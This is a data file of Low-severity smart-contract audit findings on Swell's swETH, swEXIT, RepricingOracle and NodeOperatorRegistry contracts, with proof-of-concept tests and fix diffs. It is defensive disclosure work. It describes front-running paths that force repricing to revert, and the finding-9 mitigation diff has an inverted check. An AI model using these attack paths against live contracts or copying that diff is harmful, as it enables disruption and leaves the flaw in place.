{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-006", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 6, "page_start": null, "title": "Check for staleness of data when fetching Proof of Reserves via Chainlink `Swell ETH PoR` Oracle", "short_summary": null, "description_md": null, "full_markdown": "### Check for staleness of data when fetching Proof of Reserves via Chainlink `Swell ETH PoR` Oracle\n\n**Description:** `RepricingOracle::_assertRepricingSnapshotValidity` [uses](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L329-L331) the `Swell ETH PoR` Chainlink Proof Of Reserves Oracle to fetch an off-chain data source for Swell's current reserves.\n\nThe Oracle `Swell ETH PoR` is [listed](https://docs.chain.link/data-feeds/proof-of-reserve/addresses?network=ethereum&page=1#networks) on Chainlink's website as having a heartbeat of `86400` seconds (check the \"Show More Details\" box in the top-right corner of the table), however [no staleness check](https://medium.com/SwellNetwork/chainlink-oracle-defi-attacks-93b6cb6541bf#99af) is implemented by `RepricingOracle`:\n```solidity\n// @audit no staleness check\n(, int256 externallyReportedV3Balance, , , ) = AggregatorV3Interface(\n  ExternalV3ReservesPoROracle\n).latestRoundData();\n```\n\n**Impact:** If the `Swell ETH PoR` Chainlink Proof Of Reserves Oracle has stopped functioning correctly, `RepricingOracle::_assertRepricingSnapshotValidity` will continue processing with stale reserve data as if it were fresh.\n\n**Recommended Mitigation:** Implement a staleness check and if the Oracle is stale, either revert or skip using it as the code currently does [if the oracle is not set](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L325-L327).\n\nFor multi-chain deployments ensure that a [correct staleness check is used for each feed](https://medium.com/SwellNetwork/chainlink-oracle-defi-attacks-93b6cb6541bf#fb78) as the same feed can have different heartbeats on different chains.\n\nConsider adding an off-chain bot that periodically checks if the Oracle has become stale and if it has, raises an internal alert for the team to investigate.\n\n**Swell:** Fixed in commit [84a6517](https://github.com/SwellNetwork/v3-contracts-lst/commit/84a65178c31222d80559f6fd5f1b4c60f9249016).\n\n**Cyfrin:**\nVerified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-007", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 7, "page_start": null, "title": "`swETH::reprice` may run out of gas or become exorbitantly expensive when scaling to large number of validator operators due to iterating over them all", "short_summary": null, "description_md": null, "full_markdown": "### `swETH::reprice` may run out of gas or become exorbitantly expensive when scaling to large number of validator operators due to iterating over them all\n\n**Description:** `swETH::reprice` [loops](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L303-L321) through all validator operators to pay out their share of rewards:\n```solidity\n// @audit may run out of gas for larger number of validator operators\n// or make repricing exorbitantly expensive\nfor (uint128 i = 1; i <= totalOperators; ) {\n  (\n    address rewardAddress,\n    uint256 operatorActiveValidators\n  ) = nodeOperatorRegistry.getRewardDetailsForOperatorId(i);\n\n  if (operatorActiveValidators != 0) {\n    uint256 operatorsRewardShare = wrap(operatorActiveValidators)\n      .div(totalActiveValidators)\n      .mul(wrap(nodeOperatorRewards))\n      .unwrap();\n\n    _transfer(address(this), rewardAddress, operatorsRewardShare);\n  }\n\n  // Will never overflow as the total operators are capped at uint128\n  unchecked {\n    ++i;\n  }\n}\n```\nIf Swell scales to a large number of validators `swETH::reprice` may revert due to out of gas or make the reprice operation exorbitantly expensive. `NodeOperatorRegistry::getNextValidatorDetails` may be similarly [affected](https://github.com/SwellNetwork/v3-contracts-lst/blob/c9a1e6c06d0f5b358f5c3d4b7644db7a33952444/contracts/implementations/NodeOperatorRegistry.sol#L117-L125).\n\nCurrently this represents a low risk for Swell as the protocol uses a small set of [\"permissioned group of professional node operators\"](https://docs.swellnetwork.io/swell/sweth-liquid-staking/sweth-v1.0-system-design/node-operators-set).\n\nHowever Swell intends to [transition away from](https://docs.swellnetwork.io/swell/sweth-liquid-staking/sweth-v1.0-system-design/node-operators-set) this: _\"The subsequent iterations will see the operator set **expand** and ultimately be permissionless..\"_\n\nAs Swell expands the operator set this issue will become a more serious concern and may require mitigation.\n\n**Swell:** Acknowledged.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-008", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 8, "page_start": null, "title": "`NodeOperatorRegistry::updateOperatorControllingAddress` allows to override `_newOperatorAddress` if its address is already assigned to an operator ID", "short_summary": null, "description_md": null, "full_markdown": "### `NodeOperatorRegistry::updateOperatorControllingAddress` allows to override `_newOperatorAddress` if its address is already assigned to an operator ID\n\n**Description:** Current implementation does not check if the new assigned address has already been assigned to an operator ID. As a consequence, its current value can be over written in mapping `getOperatorIdForAddress`, and `getOperatorForOperatorId` will have 2 operator IDs pointing to the same operator.\n\nThe direct consequences of this are on `_getOperatorSafe` and `_getOperatorIdSafe`, which will only return data for the new assigned operator ID.\n\nTherefore:\n* `NodeOperatorRegistry::getOperatorsPendingValidatorDetails` won't be able to return old `_newOperatorAddress` associated validators details\n* `NodeOperatorRegistry::getOperatorsActiveValidatorDetails` won't be able to return old `_newOperatorAddress` associated active validators details\n* `enableOperator` won't be able to enable old operator record\n* **__`disableOperator` won't be able to disable old operator record__**.  This can affect function `usePubKeysForValidatorSetup` given that the protocol won't be able to disable already enabled public key to be used for validator setup given that there is no way to modify previous `getOperatorForOperatorId[_newOperatorAddress].enabled` storage and [force the function to revert](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L194-L196). Given that the only one allowed to call the function is the BOT by previously calling `DepositManager::setupValidators` the impact is limited.\n* `updateOperatorRewardAddress` won't be able to modify reward address from old operator record\n* `updateOperatorName` won't be able to modify name from old operator record\n\nThis issue has not been introduced in the new changes but is in the mainnet [code](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/NodeOperatorRegistry.sol#L348-L364).\n\n**Proof Of Concept:**\nAdd the following test to `updateOperatorFields.test.ts`:\n```typescript\n    it(\"Should revert updating operator controlling address to existing address\", async () => {\n      // create another operator\n      await NodeOperatorRegistry_Deployer.addOperator(\n        \"OPERATOR_2\",\n        NewOperator.address,\n        NewOperator.address\n      );\n\n      // attempt to update first operator's controlling address to be\n      // the same as the newly created operator - should revert but doesn't\n      await NodeOperatorRegistry_Deployer.updateOperatorControllingAddress(\n        Operator.address,\n        NewOperator.address\n      );\n    });\n```\n\n**Recommended mitigation:**\nCheck that `_newOperatorAddress` is not already assigned to an operator (similar to `addOperator` which [already does this](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L300-L302), may wish to create a new private or public function for code reuse):\n```diff\n  function updateOperatorControllingAddress(\n    address _operatorAddress,\n    address _newOperatorAddress\n  )\n    external\n    override\n    checkRole(SwellLib.PLATFORM_ADMIN)\n    checkZeroAddress(_newOperatorAddress)\n  {\n\n    if (_operatorAddress == _newOperatorAddress) {\n        revert CannotSetOperatorControllingAddressToSameAddress();\n    }\n+   if(getOperatorIdForAddress[_newOperatorAddress] != 0){\n+       revert CannotUpdateOperatorControllingAddressToAlreadyAssignedAddress();\n+   }\n\n    uint128 operatorId = _getOperatorIdSafe(_operatorAddress);\n\n    getOperatorIdForAddress[_newOperatorAddress] = operatorId;\n    getOperatorForOperatorId[operatorId]\n      .controllingAddress = _newOperatorAddress;\n\n    delete getOperatorIdForAddress[_operatorAddress];\n  }\n```\n\n**Swell:** Fixed in commit [55c7d5f](https://github.com/SwellNetwork/v3-contracts-lst/commit/55c7d5fba6d55c68558dcd15de016927e07e38fd).\n\n**Cyfrin:**\nVerified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-009", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 9, "page_start": null, "title": "Allowing anyone to finalize any withdrawal can lead to integration problems for smart contract allowed to receive ETH", "short_summary": null, "description_md": null, "full_markdown": "### Allowing anyone to finalize any withdrawal can lead to integration problems for smart contract allowed to receive ETH\n\n**Description:** Current implementation of `swEXIT::finalizeWithdrawal` allows anyone to finalize any withdrawal request which is already processed. However this design decision make the strong assumption that an NFT owner always wants to finalize a withdrawal, which might not be always the case.\n\n**Impact:** Allowing anyone to finalize any withdrawal request already processed can lead to stuck ETH in some smart contracts\n\n**POC:**\nAssume a protocol which goals is facilitating NFT auctions, with auctions that can accept any token or ETH. Bidders has a record for the amount of tokens/ETH they are offering for an NFT, so the smart contract implement a `receive` function to accept ETH.\n\nEve initiate a withdrawal request, but given that she urge for ETH she decide to use this protocol to sell her NFT in an auction. To do this, she must transfer the NFT to the auction contract.\n\nAlice decide to bid for the NFT, and at the end of the auction she wins, now she has to claim the NFT (the auction contract is the owner of the NFT right now).\n\nThe swEXIT NFT is processed before Alice intend to claim it, Eve calls `finalizeWithdrawal` with the NFT in the auction contract, given that this contract is allowed to receive ETH and it is the NFT owner the transaction does not revert, and the ETH associated to the NFT now is stuck forever in the auction contract, Alice cannot claim nothing now.\n\n**Recommended Mitigation:** Only allowed the owner of the NFT to finalize a withdrawal\n\n```diff\n    function finalizeWithdrawal(uint256 tokenId) external override {\n        if (AccessControlManager.withdrawalsPaused()) {\n        revert WithdrawalsPaused();\n        }\n\n        address owner = _ownerOf(tokenId);\n\n-       if (owner == address(0)) {\n-           revert WithdrawalRequestDoesNotExist();\n+       if (owner == msg.sender) {\n+           revert WithdrawalRequestFinalizationOnlyAllowedForNFTOwner();\n        }\n```\n\n**Swell:** Fixed in commit [b5d7a19](https://github.com/SwellNetwork/v3-contracts-lst/commit/b5d7a19e2f6de5c0ae086c8deaac5166767cd3fd).\n\n**Cyfrin:**\nVerified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-010", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 10, "page_start": null, "title": "Multiple attack paths to force `swETH::reprice` to revert by increasing or decreasing swETH total supply", "short_summary": null, "description_md": null, "full_markdown": "### Multiple attack paths to force `swETH::reprice` to revert by increasing or decreasing swETH total supply\n\n**Description:** The current total swETH supply is [used](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L268-L273) in `swETH::reprice` to enforce the maximum allowed total swETH supply difference during repricings. Total supply can decrease for 2 reasons:\n1. [Withdrawal being finalized](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L205)\n2. User calls [`swETH::burn`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L350-L356) to burn their own swETH\n\nTotal supply can also increase by users calling `swETH::deposit`.\n\nThe closer the current supply difference is to the maximum tolerated difference percentage, the greater chance an attacker can front-run the repricing transaction causing it to revert by:\n1. Depositing a large enough amount of ETH via `swETH::deposit` to increase total supply\n2. Burning their own swETH to decrease total supply\n3. Finalizing one or more withdrawals (users can finalize others withdrawals) to decrease total supply\n\n**Recommended mitigation:**\nSome possible mitigations include:\n* Add a burner role and assigned it only to `swEXIT`, also add the corresponding modifier to check this role to `swETH::burn`\n* Only allow the owner of an NFT to finalize their owned withdrawal requests\n\nHowever these potential mitigations restrict functionality while still enabling an attacker to revert the reprice via the `swETH::deposit` route. Another option would be to have the bot perform the repricing transaction through a service such as [flashbots](https://www.flashbots.net/) such that the transaction can't be front-run; this would prevent all of the attack paths while still preserving the ability for users to burn their swETH and to finalize others withdrawals.\n\n**Swell:** Using flashbots to perform repricing transactions.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-011", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 11, "page_start": null, "title": "Rewards unable to be distributed when all active validators are deleted during repricing", "short_summary": null, "description_md": null, "full_markdown": "### Rewards unable to be distributed when all active validators are deleted during repricing\n\n**Description:** Invariant fuzzing found an interesting edge-case during repricing if:\n\n1) there are rewards to distribute which were accrued in the last period,\n2) all the current active validators are being deleted in the repricing operation\n\nBecause the validators are [deleted first](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L114-L122) the reprice transaction reverts with `NoActiveValidators` [error](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L298-L300).\n\nNo repricings will be possible until new active validators are added, and when that occurs the new validators will receive the rewards that were generated by the old validators which were deleted. Additionally Aaron confirmed on TG: _it is theoretically possible for fees to be generated without any active validators as any ETH sent to the `DepositManager` is considered rewards and eligible for fees._\n\n**Recommended Mitigation:** During repricing if there are no active validators but rewards to be distributed, instead of reverting the rewards should go to the Swell treasury.\n\n**Swell:** Fixed in commit [5594e20](https://github.com/SwellNetwork/v3-contracts-lst/commit/5594e204083a8507e69f0c28f4d1d7162f9a20fd).\n\n**Cyfrin:**\nVerified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-012", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 12, "page_start": null, "title": "Repricing with small rewards results in an invalid state where `ETH` reserves increase, `swETH to ETH` exchange rate increases, but no rewards are paid out to operators or treasury", "short_summary": null, "description_md": null, "full_markdown": "### Repricing with small rewards results in an invalid state where `ETH` reserves increase, `swETH to ETH` exchange rate increases, but no rewards are paid out to operators or treasury\n\n**Description:** Invariant fuzzing used repricings with small rewards to reach an invalid state where `ETH` reserves increase, `swETH : ETH` exchange rate increases, but no rewards are paid out to operators or treasury.\n\n**Proof of Concept:** During repricing:\n1) there is no minimum value enforced by either `RepricingOracle` for [`_snapshot.rewardsPayableForFees`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L227) or `swETH::reprice` for `_newETHRewards`\n2) in `swETH::reprice` there is no check for rounding down to zero precision loss when [calculating](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L239-L241) `rewardsInSwETH`\n\nThis results in the fuzzer reaching an invalid state where:\n1) by calling `RepricingOracle::submitSnapshotV2` with small values for `_snapshot.rewardsPayableForFees`, this results in `swETH::reprice` being called with small `_newETHRewards`\n2) inside `swETH::reprice` the small `_newETHRewards` triggers a rounding down to zero precision loss in the rewards calculation of `rewardsInSwETH` so [rewards are never distributed](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L278)\n3) however `swETH::reprice` does [update](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L337) `lastRepriceETHReserves` using the small positive `_newETHRewards` value and the transaction completes successfully.\n\nThis results in an invalid state where:\n\n1) `swETH::lastRepriceETHReserves` increases\n2) `swETH : ETH` exchange rate increases\n3) no rewards are being paid out to operators/treasury\n\nThis simplified PoC can be added to `reprice.test.ts`:\n```typescript\n    it(\"audit small rewards not distributed while reserves and exchange rate increasing\", async () => {\n      const swellTreasuryRewardPercentage = parseEther(\"0.1\");\n\n      await swETH_Deployer.setSwellTreasuryRewardPercentage(\n        swellTreasuryRewardPercentage\n      );\n\n      await swETH_Deployer.deposit({\n        value: parseEther(\"1000\"),\n      });\n      const preRewardETHReserves = parseEther(\"1100\");\n\n      const swETHSupply = parseEther(\"1000\");\n\n      const ethRewards = parseUnits(\"1\", \"wei\");\n\n      const swellTreasuryPre = await swETH_Deployer.balanceOf(SwellTreasury.address);\n      const ethReservesPre = await swETH_Deployer.lastRepriceETHReserves();\n      const rateBefore = await swETH_Deployer.swETHToETHRate();\n\n      swETH_Bot.reprice(\n          preRewardETHReserves,\n          ethRewards,\n          swETH_Deployer.totalSupply());\n\n      const swellTreasuryPost = await swETH_Deployer.balanceOf(SwellTreasury.address);\n      const ethReservesPost = await swETH_Deployer.lastRepriceETHReserves();\n      const rateAfter = await swETH_Deployer.swETHToETHRate();\n\n      // no rewards distributed to treasury\n      expect(swellTreasuryPre).eq(swellTreasuryPost);\n\n      // exchange rate increases\n      expect(rateBefore).lt(rateAfter);\n\n      // reserves increase\n      expect(ethReservesPre).lt(ethReservesPost);\n\n      // repricing using small `_newETHRewards` can lead to increasing reserves\n      // and increasing exchange rate without reward payouts\n    });\n```\n\nThis was not introduced in the new changes but is present in the current mainnet code [[1](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L264), [2](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L323-L325)].\n\n**Swell:** Acknowledged.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-013", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 13, "page_start": null, "title": "Precision loss in `swETH::_deposit` from unnecessary hidden division before multiplication", "short_summary": null, "description_md": null, "full_markdown": "### Precision loss in `swETH::_deposit` from unnecessary hidden division before multiplication\n\n**Description:** `swETH::_deposit` [L170](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L170) contains a hidden unnecessary [division before multiplication](https://dacian.me/precision-loss-errors#heading-division-before-multiplication) as the call to `_ethToSwETHRate` performs a division which then gets multiplied by `msg.value`:\n```solidity\nuint256 swETHAmount = wrap(msg.value).mul(_ethToSwETHRate()).unwrap();\n// @audit expanding this out\n// wrap(msg.value).mul(_ethToSwETHRate()).unwrap();\n// wrap(msg.value).mul(wrap(1 ether).div(_swETHToETHRate())).unwrap();\n```\n\nThis issue has not been introduced in the new changes but is in the mainnet [code](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L170).\n\n**Impact:** Slightly less `swETH` will be minted to depositors. While the amount by which individual depositors are short-changed is individually small, the effect is cumulative and increases as depositors and deposit size increase.\n\n**Proof of Concept:** This stand-alone stateless fuzz test can be run inside Foundry to prove this as well as provided hard-coded test cases:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.23;\n\nimport {UD60x18, wrap} from \"@prb/math/src/UD60x18.sol\";\n\nimport \"forge-std/Test.sol\";\n\n// run from base project directory with:\n// (fuzz test) forge test --match-test FuzzMint -vvv\n// (hardcoded) forge test --match-test HardcodedMint -vvv\ncontract MintTest is Test {\n\n    uint256 private constant SWETH_ETH_RATE = 1050754209601187151; //as of 2024-02-15\n\n    function _mintOriginal(uint256 inputAmount) private pure returns(uint256) {\n        // hidden division before multiplication\n        // wrap(inputAmount).mul(_ethToSwETHRate()).unwrap();\n        // wrap(inputAmount).mul(wrap(1 ether).div(_swETHToETHRate())).unwrap()\n\n        return wrap(inputAmount).mul(wrap(1 ether).div(wrap(SWETH_ETH_RATE))).unwrap();\n    }\n\n    function _mintFixed(uint256 inputAmount) private pure returns(uint256) {\n        // refactor to perform multiplication before division\n        // wrap(inputAmount).mul(wrap(1 ether)).div(_swETHToETHRate()).unwrap();\n\n        return wrap(inputAmount).mul(wrap(1 ether)).div(wrap(SWETH_ETH_RATE)).unwrap();\n    }\n\n    function test_FuzzMint(uint256 inputAmount) public pure {\n        uint256 resultOriginal = _mintOriginal(inputAmount);\n        uint256 resultFixed    = _mintFixed(inputAmount);\n\n        assert(resultOriginal == resultFixed);\n    }\n\n    function test_HardcodedMint() public {\n        // found by fuzzer\n        console.log(_mintFixed(3656923177187149889) - _mintOriginal(3656923177187149889)); // 1\n\n        // 100 eth\n        console.log(_mintFixed(100 ether) - _mintOriginal(100 ether)); // 21\n\n        // 1000 eth\n        console.log(_mintFixed(1000 ether) - _mintOriginal(1000 ether)); // 215\n\n        // 10000 eth\n        console.log(_mintFixed(10000 ether) - _mintOriginal(10000 ether)); // 2159\n    }\n}\n```\n\n**Recommended Mitigation:** Refactor to perform multiplication before division:\n```solidity\nuint256 swETHAmount = wrap(msg.value).mul(wrap(1 ether)).div(_swETHToETHRate()).unwrap();\n```\n\n**Swell:** Fixed in commit [cb093ea](https://github.com/SwellNetwork/v3-contracts-lst/commit/cb093eac675e5248a3f736a01a3725d794dd177e).\n\n**Cyfrin:**\nVerified.\n\n\\clearpage\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
